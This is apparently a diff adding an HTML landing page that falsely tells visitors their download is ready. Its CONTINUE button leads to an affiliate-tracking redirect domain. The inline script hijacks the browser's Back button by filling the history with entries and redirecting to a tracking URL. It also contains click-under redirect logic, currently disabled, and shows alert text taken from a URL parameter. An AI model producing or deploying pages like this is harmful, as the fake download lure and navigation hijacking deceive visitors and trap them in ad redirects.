@@ -1,0 +1,126 @@
+<html>
+<head>
+<title>Download ready</title>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+<style>
+body, html {
+  margin: 0;
+  padding: 0;
+  height: 100%;
+  background-color: #2B2B29;
+  color: #fff;
+  font-family: -apple-system, Roboto, Helvetica Neue, Trebuchet MS, sans-serif;
+  font-size: .6rem;
+  text-align: center;
+}
+.header {
+  flex: 0 0 auto;
+  position: relative;
+  z-index: 3;
+}
+.logo {
+  padding: 5rem 0;
+}
+.logo__text {
+  flex: 0 1 auto;
+  font-size: 3rem;
+}
+.title, .wpmodal__header {
+  padding-bottom: 1.5rem;
+  font-size: 2.5rem;
+  font-weight: 700;
+}
+.main {
+  margin-bottom: 7rem;
+  flex: 1 0 auto;
+  position: relative;
+  z-index: 3;
+}
+.content {
+  margin: 0 auto;
+  width: 80%;
+  max-width: 600px
+}
+#survey-container {
+  position: relative;
+}
+.survey__content {
+  padding: 2rem;
+  padding-bottom: 2rem;
+  color: #222;
+  font-size: 3rem;
+  transition: .4s;
+  opacity: 1;
+  min-height: 200px;
+}
+.survey__button {
+  cursor: pointer;
+  margin: 1rem;
+  padding: 1rem;
+  color: #fff;
+  background-color: #3E9B42;
+  border-radius: .5rem;
+  text-align: center;
+  background: #ffba5f;
+  background-color: rgb(255, 186, 95);
+  transition: .4s;
+  flex: 0 0 40%;
+  box-shadow: inset 0 0 0 .1rem #67a130;
+}
+.survey__button:active, .survey__button:only-child {
+  color: #fff;
+  background-color: #3E9B42;
+}
+a {
+  text-decoration: none;
+  color: #fff;
+}
+@media screen and (min-width: 425px)
+.title, .wpmodal__header {
+  font-size: 4rem;
+}
+</style>
+</head>
+<body data-theme="dark-v2,light">
+    <section class="body-wrapper">
+        <header class="header">
+            <div class="logo"><span class="logo__text" id="logo-text"></span></a></div>
+            <div class="survey" id="survey-container-place">
+                <div id="survey-container" class="survey-container" data-creative="0">
+                    <div class="survey__content  ">
+                        <div class="survey__options-wrapper question">
+                            <img class="logo__img2" alt="logo" src="1.png" style="max-width: 40rem;">
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="content" id="header__hideble-content">
+                <h1 class="title" id="content-title">Your download is ready</h1>
+                <h2 class="subtitle" id="content-subtitle"></h2>
+            </div>
+        </header>
+        <main class="main content">
+            <div class="survey" id="survey-container-place" >
+                <div id="survey-container" class="survey-container">
+                    <div class="survey__content">
+                        <a href="https://08deh.bemobtrcks.com/click" class="mainButton" style="margin:0 auto" >
+                           <div class="survey__option survey__button" style="margin:0 auto; max-width:100%" >CONTINUE</div>
+                        </a>
+                    </div>
+                </div>
+            </div>
+            </div>
+        </main>
+    </section>
+<script>
+var cta = 'mainButton';
+var back = 'https://08deh.bemobtrcks.com/go/a60af6bb-ff47-4a71-963e-f5cdb4fbf173';
+//var under = 'https://08deh.bemobtrcks.com/go/d8a08998-4942-4993-8fdd-f60630b83eb1';
+if(typeof under!=="undefined"&&under!==null){if(typeof cta!=="undefined"&&cta!==null){document.addEventListener('click',function(event){var target=event.target;while(target){if(target.tagName==='A'&&target.classList.contains(cta)){const linkHref=target.href;event.preventDefault();window.open(linkHref,'_blank');window.location.replace(under);break;}
+target=target.parentNode;}});}else{document.addEventListener('click',function(event){var target=event.target;while(target){if(target.tagName==='A'){const linkHref=target.href;event.preventDefault();window.open(linkHref,'_blank');window.location.replace(under);break;}
+target=target.parentNode;}});}}
+if(typeof back!=="undefined"&&back!==null){!(function(){var t;try{const URL=window.location.href.split(/[#]/)[0];for(t=0;10>t;++t)history.pushState({},'',URL+'#');onpopstate=function(event){event.state&&location.replace(back);};}catch(o){console.log(o);}})();}
+function getURLParameter_location(e){return decodeURI((RegExp(e+"=(.+?)(&|$)").exec(location.search)||[,null])[1]||"")}function getURLParameter_hash(e){return decodeURI((RegExp(e+"=(.+?)(&|$)").exec(location.hash)||[,null])[1]||"")}function getURLParameter(e){var a=null;return getURLParameter_hash(e)?getURLParameter_hash(e):getURLParameter_location(e)} if( getURLParameter('alert') ){ setTimeout( function(){ alert( getURLParameter('alert') ) }, 500 ); }</script>
+</body>
+</html>
